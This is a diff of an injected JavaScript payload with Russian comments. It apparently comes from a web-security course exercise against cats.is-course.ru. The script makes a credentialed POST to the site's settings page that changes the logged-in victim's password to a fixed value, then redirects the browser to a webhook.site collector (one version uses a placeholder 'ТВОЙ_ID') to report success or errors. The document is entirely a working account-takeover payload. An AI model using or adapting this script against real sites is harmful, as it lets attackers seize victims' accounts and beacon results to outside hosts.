@@ -1,20 +1,20 @@
 <script>
-// Создаем FormData
-var formData = new FormData();
-formData.append('password', 'Abcdef_1234567');
-formData.append('confirm-password', 'Abcdef_1234567');
-
 fetch('https://cats.is-course.ru/settings', {
     method: 'POST',
     credentials: 'include',
-    body: formData
-}).then(r => {
-    if(r.ok) {
-        window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?success=true";
-    } else {
-        window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?error=" + r.status;
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'new_password=Abcdef_1234567&confirm_password=Abcdef_1234567'
+})
+.then(response => {
+    // Проверяем результат
+    if(response.ok) {
+        // Пароль изменен - теперь логинимся
+        window.location = "https://webhook.site/ТВОЙ_ID?password_changed=true";
     }
+})
+.catch(error => {
+    window.location = "https://webhook.site/ТВОЙ_ID?error=" + error;
 });
-
-    
 </script>
